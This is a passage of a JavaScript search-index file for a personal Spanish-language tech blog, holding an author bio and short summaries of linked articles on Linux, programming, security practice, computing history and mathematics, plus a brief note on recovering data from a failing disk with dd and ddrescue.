var tipuesearch = {"pages":[{"title":"Who am I","text":"Karpoke es el blog personal de Nacho Cano, vivaracho admirado como programador informático, con poderes de súper vaca. Fan del steampunk , del ASCII art y de los 8 bits. Nací en el Mediterráneo. Este sitio ya no se encuentra alojado en aquel viejo portátil reciclado en servidor , abandonado en un oscuro sótano, sino que se ha mudado a GitHub Pages. La temática de la página, coincidiendo con mis gustos e intereses, está relacionada con el mundo GNU/Linux visto desde la austera perspectiva de una oscura terminal, el software libre, la administración de sistemas, la programación y la seguridad. Es un cuaderno de bitácora, compendio de anotaciones que en un momento dado pudieron resultar útiles. El contenido original de la página se encuentra publicado bajo una licencia Creative Commons Reconocimiento-CompartirIgual 3.0 , que te permite copiar, distribuir, comunicar públicamente, modificar, transformar y hacer uso de dicho contenido, siempre que se reconozca al autor y que cualquier trabajo derivado sea distribuido bajo una licencia idéntica, con una excepción: \"No autorizo a ninguna Entidad de Derechos de Autor a reclamar cantidad alguna en mi nombre\" . (Inciativa iniciada desde la desparecida \"kriptopolis\".) Si echas en falta la omnipresente y ominosa capa de aviso de cookies , te diré que éste es un blog personal sin ánimo de lucro en el que ni siquiera hay publicidad. Para contactar conmigo, puedes dejarme un comentario, enviarme un correo a nacho ARROBA ignaciocano PUNTO com , o hacerlo a través de Twitter ( @karpoke ). También puedes usar mi clave pública GPG ( ED29F34D ). Un saludo.","tags":"pages","url":"https://karpoke.ignaciocano.com/whoami/","loc":"https://karpoke.ignaciocano.com/whoami/"},{"title":"PC Keyboard: The First Five Years","text":"The vast majority of PC users today have no memory of what PC keyboards looked like before the standard 101/102-key layout arrived, even though various OEMs do their best to mangle the standard layout in order to minimize usability, especially on laptops. OEM-specific modifications aside, the basic layout of the main block of alphanumeric keys has not changed in over 30 years, since 1986. However, up until that point the PC keyboard layout and the keyboard hardware changed quite a bit, and looking at the 1981-1986 IBM Technical References is key to understanding a) why the standard keyboard scan codes are so complex, and b) why there are so many seemingly odd vendor-specific modifications of the standard layout. OS/2 Museum | [opensource.com][]","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/10/27/pc-keyboard-the-first-five-years/","loc":"https://karpoke.ignaciocano.com/2019/10/27/pc-keyboard-the-first-five-years/"},{"title":"10 Data Structure & Algorithms Books Every Programmer Should Read","text":"A collection of awesome Algorithms books which should find a place in every programmer's book self. Includes language specific books in Java, Python, and JavaScript for easy learning. Algorithms are language agnostic and any programmer worth their salt should be able to convert them to code in their programming language of choice. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/06/21/10-data-structure-amp-algorithms-books-every-programmer-should-read/","loc":"https://karpoke.ignaciocano.com/2019/06/21/10-data-structure-amp-algorithms-books-every-programmer-should-read/"},{"title":"10 Popular Websites Built With Django","text":"What is the framework Regardless of the sphere you work in, one of your most important tasks is to create a fast, good-looking website. Today, almost every business needs a website, which acts as a sort of business card for a company or online service. It helps you engage with customers, promote your business, increase sales and so on. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/05/28/10-popular-websites-built-with-django/","loc":"https://karpoke.ignaciocano.com/2019/05/28/10-popular-websites-built-with-django/"},{"title":"10 OOP Design Principles Every Programmer Should Know","text":"The Object-Oriented Design Principles are the core of OOP programming, but I have seen most of the Java programmers chasing design patterns like Singleton pattern, Decorator pattern, or Observer pattern, and not putting enough attention on learning Object-oriented analysis and design. It's important to learn the basics of Object-oriented programming like Abstraction, Encapsulation, Polymorphism and Inheritance. But, at the same time, it's equally important to know object-oriented design principles. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/05/06/10-oop-design-principles-every-programmer-should-know/","loc":"https://karpoke.ignaciocano.com/2019/05/06/10-oop-design-principles-every-programmer-should-know/"},{"title":"10 moments that shaped Linux history","text":"In August 2018, Opensource.com posted a poll with seven options asking readers: What was the most important moment in the history of Linux? I thought I would expand on the list and present 10 moments that I think have played an important part in shaping the history of Linux. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/04/30/10-moments-that-shaped-linux-history/","loc":"https://karpoke.ignaciocano.com/2019/04/30/10-moments-that-shaped-linux-history/"},{"title":"Un paseo matemático por la Alhambra: cuando el arte se basa en los números","text":"A ojos de alguien no-experto en matemáticas, el arco que encabeza estas líneas puede transmitir una gran armonía, pero resultaría difícil explicar el por qué. La causa de esa armonía está en las matemáticas empleadas para su diseño, para una composición extraordinariamente calculada. Este arco en concreto es el arco del mihrab islámico cordobés del granadino palacio de la Madraza, un lugar que indica hacia qué dirección se debe rezar según la religión musulmana. Si nos fijamos, los arcos interior y exterior no son concéntricos, es decir, no comparten el mismo eje. El arco interior está elevado R/2 por encima del eje de impostas, y el arco exterior elevado un R/5. Xataka | xataka.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/04/01/un-paseo-matematico-por-la-alhambra-cuando-el-arte-se-basa-en-los-numeros/","loc":"https://karpoke.ignaciocano.com/2019/04/01/un-paseo-matematico-por-la-alhambra-cuando-el-arte-se-basa-en-los-numeros/"},{"title":"10 Awesome Security Tips for Python Enthusiasts","text":"Software development is an amazing job that can sometimes feel like juggling chainsaws. Between maintaining your current code base and releasing new features and projects, it is fairly easy to think of security as Someone Else's Problem --you have enough to deal with. But there is a major benefit to incorporating security consciousness into your workflow. DEV Community | dev.to","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/03/03/10-awesome-security-tips-for-python-enthusiasts/","loc":"https://karpoke.ignaciocano.com/2019/03/03/10-awesome-security-tips-for-python-enthusiasts/"},{"title":"10 Cool Command Line Tools For Your Linux Terminal","text":"In this article, we will share a number of cool command-line programs that you can use in a Linux terminal. By the end of this article, you will learn about some free, open source, and exciting, text-based tools to help you do more with boredom on the Command line. Tecmint: Linux Howtos, Tutorials & Guides | tecmint.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/02/03/10-cool-command-line-tools-for-your-linux-terminal/","loc":"https://karpoke.ignaciocano.com/2019/02/03/10-cool-command-line-tools-for-your-linux-terminal/"},{"title":"10 Tools To Power Up Your Command Line","text":"This post is the first in series of showcases of some of the best non-standard command line tools I've discovered in recent years. If you ever make use of the command line, you'll probably find that at least one item on this page will make your life easier. DEV Community | dev.to","tags":"micropost","url":"https://karpoke.ignaciocano.com/2019/01/04/10-tools-to-power-up-your-command-line/","loc":"https://karpoke.ignaciocano.com/2019/01/04/10-tools-to-power-up-your-command-line/"},{"title":"10 Myths About Microservices","text":"10 myths about Microservices, that we often hear to believe it is true. Micro-services has become a very hot topic in the last half-decade. After Agile, DevOps, its Microservices that we hear everywhere I go. The unfortunate thing that I witnessed though, is that, every organization and every person in that organization has their own definition of what a Microservice is. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/12/25/10-myths-about-microservices/","loc":"https://karpoke.ignaciocano.com/2018/12/25/10-myths-about-microservices/"},{"title":"¿Qué son los argumentos universales?","text":"Los argumentos universales son los relatos o situaciones dramáticas que se repiten en todas las culturas, épocas y formatos. Se repiten una y mil veces en el cine, el teatro, la literatura, la televisión, el videojuego... George Polti en su libro clásico \"Las 36 situaciones dramáticas\" redujo toda posible acción teatral en 36 paradigmas. En \"La semilla inmortal. Los argumentos universales en el cine\", los autores Jordi Balló y Xavier Pérez sostienen que en el cine hay 21 argumentos que se repiten continuamente. En dicho libro proponen un recorrido por las grandes películas de la historia del cine relacionando los argumentos con obras maestras de la literatura. Cada uno de los 21 capítulos del libro comienza con la explicación de un argumento original para después explicar cómo el cine toma las constantes de dicho argumento y las desarrolla por múltiples vías pero manteniendo siempre la estructura del relato original. David Esteban Cubero | cursosdeguion.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/12/18/que-son-los-argumentos-universales/","loc":"https://karpoke.ignaciocano.com/2018/12/18/que-son-los-argumentos-universales/"},{"title":"5 Fatal Docker Gotcha's 😱 - for new users","text":"Developing with docker containers is great! And we at uilicious run our entire backend on top of docker. It would have been impossible to have launch uilicious at our current cost and scale without docker. However as with all technologies, there are hidden, not so obvious, gotcha's reaching there, especially when running Docker at scale across multiple hosts. Especially for those migrating from physical servers, or virtualized machines workload. DEV Community | dev.to","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/11/20/5-fatal-docker-gotcha-s-for-new-users/","loc":"https://karpoke.ignaciocano.com/2018/11/20/5-fatal-docker-gotcha-s-for-new-users/"},{"title":"La historia del sistema operativo Unix y los ordenadores de la época narrada por Rob Pike","text":"Sus inicios coincidieron con el Sistema 360 de IBM, máquinas que andaban por las universidades en los 70 curiosamente «un tanto desocupados» porque la gente no sabía muy bien qué hacer con ellos. Pike aprendió allí a programar. Luego tuvo acceso a un PDP-11 en la universidad de Toronto y a otras máquinas. Cuando llegó a los los laboratorios Bell se encontró con el Unix recién nacido y trabajó con Ken Thompson y con Kernighan y Ritchie, creadores del lenguaje C. Microsiervos | microsiervos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/11/11/la-historia-del-sistema-operativo-unix-y-los-ordenadores-de-la-epoca-narrada-por-rob-pike/","loc":"https://karpoke.ignaciocano.com/2018/11/11/la-historia-del-sistema-operativo-unix-y-los-ordenadores-de-la-epoca-narrada-por-rob-pike/"},{"title":"10 Data Structure, Algorithms, and Programming Courses to Crack Any Coding Interview","text":"Many junior developers dream of making it at one of the larger tech companies, but, to be honest with you, getting your first job is never easy. It is, in fact, one of the hardest things in your life and you need to put your best effort to find a job in your dream company. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/10/26/10-data-structure-algorithms-and-programming-courses-to-crack-any-coding-interview/","loc":"https://karpoke.ignaciocano.com/2018/10/26/10-data-structure-algorithms-and-programming-courses-to-crack-any-coding-interview/"},{"title":"4 Ways to Disable Root Account in Linux","text":"The root account is the ultimate account on a Linux and other Unix-like operating systems. This account has access to all commands and files on a system with full read, write and execute permissions. It is used to perform any kind of task on a system; to create/update/access/delete other users' accounts, install/remove/upgrade software packages, and so much more. Tecmint: Linux Howtos, Tutorials & Guides | tecmint.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/10/21/4-ways-to-disable-root-account-in-linux/","loc":"https://karpoke.ignaciocano.com/2018/10/21/4-ways-to-disable-root-account-in-linux/"},{"title":"10 Basic Tips on Working Fast in UNIX or Linux Terminal","text":"Have you ever amazed to see someone working very fast in UNIX, firing commands and doing things quickly? Yes, I have seen that a couple of times and It has always inspired me inspired to learn from those superstar developers. In this article, or tutorial, or whatever you call it, I have shared some UNIX command practices I follow to work fast, quick, or efficiently in Linux. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/10/18/10-basic-tips-on-working-fast-in-unix-or-linux-terminal/","loc":"https://karpoke.ignaciocano.com/2018/10/18/10-basic-tips-on-working-fast-in-unix-or-linux-terminal/"},{"title":"10 React JS Articles Every Web Developer Should Read","text":"Hello Guys, React or React JS is a JavaScript front-end library from Facebook which lets you create HTML based GUI. It makes the task easier by providing a component-based architecture which was only available to languages like Java and C# before. Because of this awesome feature, React is quickly becoming the standard JavaScript library for developing front-end. That's the reason many programmers and developers are learning React or React JS. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/10/06/10-react-js-articles-every-web-developer-should-read/","loc":"https://karpoke.ignaciocano.com/2018/10/06/10-react-js-articles-every-web-developer-should-read/"},{"title":"Should you learn C to \"learn how the computer works\"?","text":"I've often seen people suggest that you should learn C in order to learn how computers work. Is this a good idea? Is this accurate? I'm going to start with my conclusion right upfront, just to be crystal clear about what I'm saying here: * C is not \"how the computer works.\" * I don't think most people mean this phrase literally, so that is sort of irrelevant. * Understanding the context means that learning C for this reason may still be a good idea for you, depending on your objectives. Steve Klabnik | steveklabnik.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/10/04/should-you-learn-c-to-learn-how-the-computer-works/","loc":"https://karpoke.ignaciocano.com/2018/10/04/should-you-learn-c-to-learn-how-the-computer-works/"},{"title":"10 años de Android: así ha evolucionado el mejor sistema móvil","text":"El día 23 de septiembre de 2008 es una fecha marcada para Google en el calendario, ese día se presentó al público la versión 1.0 de Android. Un sistema que, aunque parece llevar con nosotros desde siempre, cumple hoy diez años. Nada más y nada menos. Aunque su desarrollo empezó varios años antes de 2008, en una época en la que los reyes del sector eran Symbian y BlackBerry. El Androide Libre | elandroidelibre.elespanol.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/09/24/10-anos-de-android-asi-ha-evolucionado-el-mejor-sistema-movil/","loc":"https://karpoke.ignaciocano.com/2018/09/24/10-anos-de-android-asi-ha-evolucionado-el-mejor-sistema-movil/"},{"title":"8 Python packages that will simplify your life with Django","text":"Django developers, we're devoting this month's Python column to packages that will help you. These are our favorite Django libraries for saving time, cutting down on boilerplate code, and generally simplifying our lives. We've got six packages for Django apps and two for Django's REST Framework, and we're not kidding when we say these packages show up in almost every project we work on. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/09/21/8-python-packages-that-will-simplify-your-life-with-django/","loc":"https://karpoke.ignaciocano.com/2018/09/21/8-python-packages-that-will-simplify-your-life-with-django/"},{"title":"10 practices for readable code","text":"I've been writing code for 20 years. During that time I've worked with 17 teams coding different languages to build hundreds of projects. These include everything from a simple blog site, to APIs supporting 3,000 requests/second, to top selling apps. From these experiences, combined with the books I've read, it's become apparent to me what matters most in code: readability. Jason McCreary | jason.pureconcepts.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/09/19/10-practices-for-readable-code/","loc":"https://karpoke.ignaciocano.com/2018/09/19/10-practices-for-readable-code/"},{"title":"4 open source monitoring tools","text":"Isn't monitoring just monitoring? Doesn't it include logging, visualization, and time-series data? The terminology around monitoring has caused a lot of confusion over the years and has led to some poor tools that tout the ability to do everything in one format. Observability proponents recognize there are many levels for observing a system. Metrics aggregation is primarily time-series data, and that's what we'll discuss in this article. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/30/4-open-source-monitoring-tools/","loc":"https://karpoke.ignaciocano.com/2018/08/30/4-open-source-monitoring-tools/"},{"title":"10 Alpine Linux apk Command Examples","text":"New to lightweight and systemd free Alpine Linux and package management? Try my simple guide that explains how to install, remove, query and manage packages on an Alpine Linux. nixCraft: Linux Tips, Hacks, Tutorials, And Ideas In Blog Format | cyberciti.biz","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/27/10-alpine-linux-apk-command-examples/","loc":"https://karpoke.ignaciocano.com/2018/08/27/10-alpine-linux-apk-command-examples/"},{"title":"5 open source tools for container security","text":"As containers become an almost ubiquitous method of packaging and deploying applications, the instances of malware have increased. Securing containers is now a top priority for DevOps engineers. Fortunately, a number of open source programs are available that scan containers and container images. Let's look at five such tools. Anchore, Clair, Dagda, OpenSCAP and Sysdig Falco. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/23/5-open-source-tools-for-container-security/","loc":"https://karpoke.ignaciocano.com/2018/08/23/5-open-source-tools-for-container-security/"},{"title":"10 Best Android News App Templates","text":"The best news app templates organise news into a few broad categories, allow users to save news stories they want to read later in a favourites list, and have a powerful search feature that helps them find relevant news stories quickly and easily. Whether you're interested in building a news app from posts on your own website, creating an app for a localised news source, or pulling together all mll major news sources into one handy app, you're sure to find a template that's right for you from among these ten best Android news app templates available at CodeCanyon. Nettuts+ | code.tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/14/10-best-android-news-app-templates/","loc":"https://karpoke.ignaciocano.com/2018/08/14/10-best-android-news-app-templates/"},{"title":"10 Best Kodi Repositories For Downloading Popular Addons | 2019 List","text":"With online streaming becoming popular by the day, there has been a rise in the portals and apps that allow you to stream content in a hassle-free manner. Now, to watch the content from different sources, you would need a centralized media player and this is where Kodi comes into the picture. Fossbytes | fossbytes.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/09/10-best-kodi-repositories-for-downloading-popular-addons-2019-list/","loc":"https://karpoke.ignaciocano.com/2018/08/09/10-best-kodi-repositories-for-downloading-popular-addons-2019-list/"},{"title":"10 cosas de Google que aún no conoces","text":"Hablar de Google es mencionar a una multinacional sin precedentes en el mundo de la tecnología. Los avances de esta compañía estadounidense a lo largo de los años han sido increíbles, pero no todo lo que esta empresa hace sale a la luz pública de forma sencilla. Por esta razón, hoy hemos querido recopilar 10 curiosidades de Google que seguro no conoces o nunca escuchaste. Wwwhat's new? | wwwhatsnew.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/08/06/10-cosas-de-google-que-aun-no-conoces/","loc":"https://karpoke.ignaciocano.com/2018/08/06/10-cosas-de-google-que-aun-no-conoces/"},{"title":"10 libros de seguridad informática para leer este verano","text":"Tal y como hiciéramos en las navidades pasadas, vamos a recomendar unos cuantos libros para que el estío se nos haga más soportable. Abundan las calores y nada mejor que un librazo y algo fresco que echarse al coleto para aguantar las terribles temperaturas que nos quedan por soportar. En HISPASEC nos gustan los libros, mucho, y cuando salimos de vacaciones asaltamos la biblioteca de empresa y sacamos varios volúmenes (algunos incunables) prestados, para devolverlos sanos y salvos (aunque con algo de salitre y tufillo a carbón de chiringuito) de vuelta a la estantería cuando comienza el nuevo curso escolar. una-al-dia Hispasec | unaaldia.hispasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/07/23/10-libros-de-seguridad-informatica-para-leer-este-verano/","loc":"https://karpoke.ignaciocano.com/2018/07/23/10-libros-de-seguridad-informatica-para-leer-este-verano/"},{"title":"10 killer tools for the admin in a hurry","text":"Administering networks and systems can get very stressful when the workload < piles up. Nobody really appreciates how long anything takes, and everyone wants their specific thing done yesterday. So it's no wonder so many of us are drawn to the open source spirit of figuring out what works and sharing it with everyone. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/07/04/10-killer-tools-for-the-admin-in-a-hurry/","loc":"https://karpoke.ignaciocano.com/2018/07/04/10-killer-tools-for-the-admin-in-a-hurry/"},{"title":"10 common security gotchas in Python and how to avoid them","text":"Writing secure code is hard. When you learn a language, a module or a framework, you learn how it supposed to be used. When thinking about security, you need to think about how it can be misused. Python is no exception, even within thestandard library there are documented bad practices for writing hardened applications. Yet, when I've spoken to many Python developers they simply aren't aware of them. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/06/19/10-common-security-gotchas-in-python-and-how-to-avoid-them/","loc":"https://karpoke.ignaciocano.com/2018/06/19/10-common-security-gotchas-in-python-and-how-to-avoid-them/"},{"title":"10 7zip (File Archive) Command Examples in Linux","text":"7-Zip is a free open source, cross-platform, powerful, and fully-featured file archiver with a high compression ratio, for Windows. It has a powerful command line version that has been ported to Linux/POSIX systems. Tecmint: Linux Howtos, Tutorials & Guides | tecmint.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/31/10-7zip-file-archive-command-examples-in-linux/","loc":"https://karpoke.ignaciocano.com/2018/05/31/10-7zip-file-archive-command-examples-in-linux/"},{"title":"3 Python command-line tools","text":"Sometimes the right tool for the job is a command-line application. A command-line application is a program that you interact with and run from something like your shell or Terminal. Git and Curl are examples of command-line applications that you might already be familiar with. Opensource.com | opensource.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/31/3-python-command-line-tools/","loc":"https://karpoke.ignaciocano.com/2018/05/31/3-python-command-line-tools/"},{"title":"You-Get, descarga contenido multimedia utilizando la terminal","text":"En el siguiente artículo vamos a echar un vistazo a You-Get. Se trata de un programa de CLI escrito en Python. Nos va a permitir permite descargar imágenes, audio y vídeos de algunos sitios web populares como son Youtube, Facebook, Twitter, Vimeo y mucho más. Actualmente tiene unos 80 sitios web compatibles. Ubunlog | ubunlog.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/20/you-get-descarga-contenido-multimedia-utilizando-la-terminal/","loc":"https://karpoke.ignaciocano.com/2018/05/20/you-get-descarga-contenido-multimedia-utilizando-la-terminal/"},{"title":"12 hackers que preceden la invención del ordenador personal","text":"En las últimas décadas la palabra hacker ha sido automáticamente asociada con los ordenadores personales, sin embargo, la historia nos dice que el hacking como práctica precede por mucho al inolvidable IBM PC. Tarjetas perforadas, teléfonos y telégrafos fueron los blancos favoritos de expertos y entusiastas por igual, enfocados en demostrar las debilidades de esos sistemas, obtener un par de dólares extra, y en casos más críticos, salvar vidas. Hoy vamos a nombrar a algunos de ellos. NeoTeo | neoteo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/17/12-hackers-que-preceden-la-invencion-del-ordenador-personal/","loc":"https://karpoke.ignaciocano.com/2018/05/17/12-hackers-que-preceden-la-invencion-del-ordenador-personal/"},{"title":"10 comandos de terminal que quizás no conocías","text":"En el día a día del administrador de sistemas o del cada vez más popular DevOps, utilizar la terminal es algo que consume gran parte de nuestro tiempo, ya sea realizando tareas normales, tareas de automatización o durante procesos de configuración de sistemas. Pasamos gran parte de nuestro tiempo delante de una terminal y debemos aprender los comandos más interesantes que nos ayuden a realizar las tareas más rápida y cómodamente. Emezeta blog | emezeta.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/14/10-comandos-de-terminal-que-quizas-no-conocias/","loc":"https://karpoke.ignaciocano.com/2018/05/14/10-comandos-de-terminal-que-quizas-no-conocias/"},{"title":"12 \"Manager READMEs\" from Silicon Valley's Top Tech Companies","text":"What does tech management at Slack, HubSpot, Netflix, Etsy, Shopify, InVision, and more have in common? A lot, apparently! When we launched our first SoapBox hero I was surprised to discover a document used to introduce her working style to her team. I had never seen that before and it was awesome! Did others have these? I needed to know. Eventually, I found a treasure trove of examples by Engineering Leaders from companies with some of the best culture in tech. Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/05/03/12-manager-readmes-from-silicon-valley-s-top-tech-companies/","loc":"https://karpoke.ignaciocano.com/2018/05/03/12-manager-readmes-from-silicon-valley-s-top-tech-companies/"},{"title":"10 Biggest Features Of New Gmail For Web You Need To Use","text":"The much-awaited makeover of Gmail web interface is here after five long years. Google has not only redesigned the look but also added several new functionalities. However, you will get to the see the new features only if you opt-in for the new Gmail layout. While there are a bunch of features that are neat but many of them are minor ones. So let's take a look at the ones that are actually useful. Fossbytes | fossbytes.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/04/30/10-biggest-features-of-new-gmail-for-web-you-need-to-use/","loc":"https://karpoke.ignaciocano.com/2018/04/30/10-biggest-features-of-new-gmail-for-web-you-need-to-use/"},{"title":"10 computadoras clásicas que hicieron historia","text":"Mucho más tarde se inventó el algoritmo, el cálculo numérico, la regla de cálculo, la máquina de calcular, la tarjeta perforada o la primera calculadora automática que se fabricó y empleó a escala industrial. En 1936 llegó la revolución cuando el matemático Alan Turing -considerado con justicia el \"padre de la ciencia de la computación\"- formalizó los conceptos de algoritmo y de máquina de Turing. Foro de elhacker.net - Noticias | foro.elhacker.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/04/20/10-computadoras-clasicas-que-hicieron-historia/","loc":"https://karpoke.ignaciocano.com/2018/04/20/10-computadoras-clasicas-que-hicieron-historia/"},{"title":"10 DevOps Interview Answers","text":"In a previous post, I put together a list of 10 questions for DevOps team managers to use as a point of reference when interviewing potential DevOps engineers. Each question included an in-depth explanation and follow-up questions, so in case you were, or are now, a candidate, that list could help you prepare for interviews. Logz.io | logz.io","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/04/05/10-devops-interview-answers/","loc":"https://karpoke.ignaciocano.com/2018/04/05/10-devops-interview-answers/"},{"title":"1.1.1.1: servicio DNS que acelera tu internet y valora tu privacidad","text":"Cloudflare ha anunciado un nuevo servicio de DNS gratuito bajo los IPs 1.1.1.1 y 1.0.0.1 con dos objetivos: acelerar la conexión de internet y proteger la privacidad de cualquier persona que lo use. ALT1040 | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/04/02/1-1-1-1-servicio-dns-que-acelera-tu-internet-y-valora-tu-privacidad/","loc":"https://karpoke.ignaciocano.com/2018/04/02/1-1-1-1-servicio-dns-que-acelera-tu-internet-y-valora-tu-privacidad/"},{"title":"Quién era Kurt Gödel, el hombre que caminaba con Albert Einstein (y al que comparan con Aristóteles)","text":"Pero ahora lo acompañaba un hombre más joven, con una vestimenta más tradicional, gruesas gafas y una expresión austera. Aunque no tan famoso, era muy conocido, particularmente en los círculos académicos por haber \"sacudido los fundamentos de nuestra entendimiento (…) de la mente humana\", según declaró la Universidad de Princeton al otorgarle un doctorado honorario. El acompañante de Einstein era el matemático austríaco Kurt Gödel, a menudo descrito como el más grande filósofo lógico desde Aristóteles. BBC Mundo | bbc.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/04/02/quien-era-kurt-godel-el-hombre-que-caminaba-con-albert-einstein-y-al-que-comparan-con-aristoteles/","loc":"https://karpoke.ignaciocano.com/2018/04/02/quien-era-kurt-godel-el-hombre-que-caminaba-con-albert-einstein-y-al-que-comparan-con-aristoteles/"},{"title":"10 Pure CSS Responsive Navigation Code Snippets","text":"Designing a responsive layout doesn't need to be difficult. Especially if you initially wireframe to plan ahead and figure out exactly what you're creating. One of the hardest parts of a good responsive site is the navigation. This can take a while to figure out and there are plenty of tutorials to help with that. But I'm also a fan of using code snippets like the ones I've collected for this article. Speckyboy Design Magazine | speckyboy.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/03/28/10-pure-css-responsive-navigation-code-snippets/","loc":"https://karpoke.ignaciocano.com/2018/03/28/10-pure-css-responsive-navigation-code-snippets/"},{"title":"10 Best Practices to Follow for Android Application Security","text":"Mobile phones enable us to do almost everything online—from any place and at any time. As mobile activities are soaring, and digital activities are thriving, hackers aren't long ways behind. In case you're making an app or already have an app in the market, it's essential to secure your application, your information, and your user's information. Here's why? Open Source For You | opensourceforu.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/02/23/10-best-practices-to-follow-for-android-application-security/","loc":"https://karpoke.ignaciocano.com/2018/02/23/10-best-practices-to-follow-for-android-application-security/"},{"title":"Recuperar un disco corrupto","text":"Un par de comandos útiles para recuperar datos de un disco problemático. Para copiar el disco, mostrando una barra de progeso: bash dd if=/dev/sda | pv | dd of=/dev/sdb conv=noerror,sync Lanzamos ddrescue : bash ddrescue -d -r3 /dev/sda /dev/sdb output.log","tags":"admin","url":"https://karpoke.ignaciocano.com/2018/01/30/recuperar-un-disco-corrupto/","loc":"https://karpoke.ignaciocano.com/2018/01/30/recuperar-un-disco-corrupto/"},{"title":"10 alternativas al software Nmap disponibles para Linux y otros sistemas operativos","text":"Se trata de uno de los softwares más utilizados por usuarios y profesionales para conocer, sobre todo, las conexiones activas existentes en un equipo. Posee licencia GNU y se puede adquirir de forma totalmente gratuita. Está desarrollado utilizando varios lenguajes, como C, Java o incluso Python. RedesZone | redeszone.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/25/10-alternativas-al-software-nmap-disponibles-para-linux-y-otros-sistemas-operativos/","loc":"https://karpoke.ignaciocano.com/2018/01/25/10-alternativas-al-software-nmap-disponibles-para-linux-y-otros-sistemas-operativos/"},{"title":"10 Lessons from 10 Years of AWS (part 2)","text":"As explained in part one, I recently presented a talk at the AWS Community Day in Bangalore. The tweet following the talk became my most popular tweet ever and I received quite a few requests for more details. This is part two of the blog post. Hope you enjoy as-well! Please do not hesitate to give feedback, share your own stories or simply like :) Hacker Noon | hackernoon.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/16/10-lessons-from-10-years-of-aws-part-2/","loc":"https://karpoke.ignaciocano.com/2018/01/16/10-lessons-from-10-years-of-aws-part-2/"},{"title":"10 Tools To Add Some Spice To Your UNIX/Linux Shell Scripts","text":"With the following tools, you can build powerful, interactive, user-friendly UNIX/Linux bash shell scripts. nixCraft: Linux Tips, Hacks, Tutorials, And Ideas In Blog Format | cyberciti.biz","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/14/10-tools-to-add-some-spice-to-your-unix-linux-shell-scripts/","loc":"https://karpoke.ignaciocano.com/2018/01/14/10-tools-to-add-some-spice-to-your-unix-linux-shell-scripts/"},{"title":"10 Best VPN Services Of 2019: Top VPN Provider Reviews & Buying Guide","text":"Using a top-rated VPN is one of the best ways to protect your online privacy in today's times. They also serve other purposes like website unblocking, remote access to company resources, bypassing censorship, etc. In this article, we've reviewed the top VPN services and listed their best features to help you make an informed decision while spending your hard-earned money. Fossbytes | fossbytes.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/11/10-best-vpn-services-of-2019-top-vpn-provider-reviews-amp-buying-guide/","loc":"https://karpoke.ignaciocano.com/2018/01/11/10-best-vpn-services-of-2019-top-vpn-provider-reviews-amp-buying-guide/"},{"title":"3 paradojas que le quitan el sueño a los matemáticos y filósofos","text":"El barco en el que Teseo y la juventud de Atenas regresaron de Creta tenía treinta remos, y fue conservado por los atenienses incluso hasta la época de Demetrio de Falero, ya que retiraron los viejos tablones a medida que se descomponían e introdujeron madera nueva y más resistente en su lugar, tanto que este barco se convirtió en un ejemplo permanente entre los filósofos, para la pregunta lógica de las cosas que crecen, un lado sostiene que el barco sigue siendo el mismo, y el otro afirma que no. bbc.com | bbc.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2018/01/11/3-paradojas-que-le-quitan-el-sueno-a-los-matematicos-y-filosofos/","loc":"https://karpoke.ignaciocano.com/2018/01/11/3-paradojas-que-le-quitan-el-sueno-a-los-matematicos-y-filosofos/"},{"title":"10 Lessons from 10 Years of AWS (part 1)","text":"I recently presented a talk at the AWS Community Day in Bangalore. The tweet following the talk became my most popular tweet ever and I received quite a few requests for more details. For the last 10 years, I have had the chance to work in companies 